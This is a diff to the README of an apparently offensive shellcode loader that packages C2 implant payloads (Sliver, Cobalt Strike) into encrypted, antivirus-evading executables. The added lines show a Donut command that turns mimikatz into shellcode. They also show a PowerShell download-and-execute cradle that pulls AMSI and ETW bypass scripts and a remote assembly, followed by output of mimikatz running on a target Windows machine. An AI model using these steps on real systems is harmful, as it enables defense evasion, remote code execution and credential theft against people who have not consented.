@@ -41,7 +41,7 @@ sudo apt install mono-complete
 
 ### Guide
 
-1. Generate shellcode for supported C2 implant in raw format:
+1. Generate shellcode for supported C2 implant in raw format (this is acutally can be used to load any payload in raw shellcode format):
    
 For Sliver:
 
@@ -79,6 +79,28 @@ For CobaltStrike:
 ### Move the cobaltstrike.bin to folder input and rename to cobaltstrike.bin, then run the autogen script.
 ```
 
+For any sharp tools, thanks to the cool tool [Donut](https://github.com/TheWover/donut/releases), we can convert any sharp EXE file into raw shellcode then used into this loader:
+
+```
+### To Generate shellcode from the EXE using donut:
+┌──(root㉿average-student)-[/opt/donut_v0.9.3]
+└─# ./donut -e 3 -a 3 -b 1 -f 1 -x 1 -p "coffee" -o /root/myCodes/sn0wldr/input/other.bin ./mimikatz.exe
+
+  [ Donut shellcode generator v0.9.3
+  [ Copyright (c) 2019 TheWover, Odzhan
+
+  [ Instance type : Embedded
+  [ Module file   : "./mimikatz.exe"
+  [ Entropy       : Random names + Encryption
+  [ File type     : EXE
+  [ Parameters    : coffee
+  [ Target CPU    : x86+amd64
+  [ AMSI/WDLP     : none
+  [ Shellcode     : "/root/myCodes/sn0wldr/input/other.bin"
+                                                                                       
+
+```
+
 2. Move the generated shellcode bin file to `input` folder, and rename it as format: `<c2type>.bin`
 
 3. Run the autogen script `autogen_loader.sh`, wait for couple of minutes and check the generated encrypted EXE in the output folder.
@@ -100,11 +122,38 @@ For CobaltStrike:
 
 ```
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/etw.txt"));
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));
-Invoke-LoadAssembly -AssemblyUrl https://not.o0.rs/halosli64x2.exe -Command ""
+Invoke-LoadAssembly -AssemblyUrl https://<your_server>/halosli64x2.exe -Command ""
+```
+
+5. The following shows the successful mimikatz execution on the target Windows 10 machine:
+
+```
+PS C:\Users\tester\Downloads\test> Invoke-LoadAssembly -AssemblyUrl "http://192.168.174.150/sn0wmimicoffee.exe" -Command ""
+[mySharphalo.UsageExample]::Main($Command.Split(" "))
+[+] handle 0D6C! meow executed!
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # coffee
+
+    ( (
+     ) )
+  .______.
+  |      |]
+  \      /
+   `----'
+
+mimikatz #
 ```
 
 ### To Do
 
 - Add bananameowloader for even better AV bypass
-- Add InlineExecute-Assembly BoF support for Sliver
+
